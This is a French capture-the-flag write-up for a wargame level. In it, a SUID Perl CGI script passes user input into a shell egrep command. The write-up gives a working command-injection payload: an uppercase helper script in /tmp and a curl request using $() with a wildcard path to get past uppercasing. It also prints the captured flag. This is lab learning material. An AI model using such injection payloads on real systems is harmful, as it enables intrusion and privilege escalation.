## LEVEL12

- Ce level contient un fichier `level12.pl` : 
```bash
-rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl
```
- Toujours avec le bit SUID, qui permet d'exécuter le script en tant que flag12.

- Ce script contient : 
```perl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));
```



## EXPLOITATION

- Ce level semble très similaire à celui du level04, la différence vient du fait que notre entrée va subir une modification avant d'être injectée dans la commande à cette ligne :
```perl
 @output = `egrep "^$xx" /tmp/xd 2>&1`;
 ```

 - En effet les 2 lignes précédentes vont mettre en majuscule toutes les lettres et tronquer l’entrée au premier espace. Notre injection ne doit donc être composée d'aucun espace et sera entièrement en majuscule.

- En premier lieu on peut faire un script dont le nom est entierement en majuscule, qui appellera `\getflag` et ecrira la sortie dans un fichier.  
On crée donc le script `GETFLAG` dans /tmp :
```bash
#!/bin/bash

/bin/getflag > /tmp/flag.txt
```
- On n’oublie pas de lui donner les droits d’exécution :
```bash
chmod 777 /tmp/GETFLAG
```
- Le 2ᵉ problème vient du fait que /tmp sera aussi transformé en majuscule, il faut donc utiliser un `*`, la commande tentera donc de résoudre le chemin à l’aide d’un wildcard.

- On lance donc la commande curl suivante :
```bash
 curl 'http://localhost:4646?x=$(/*/GETFLAG)'
```

- Il reste ensuite qu’à lire le contenu du fichier `/tmp/flag.txt`

## FLAG
- g1qKMiRpXf53AWhDaU7FEkczr

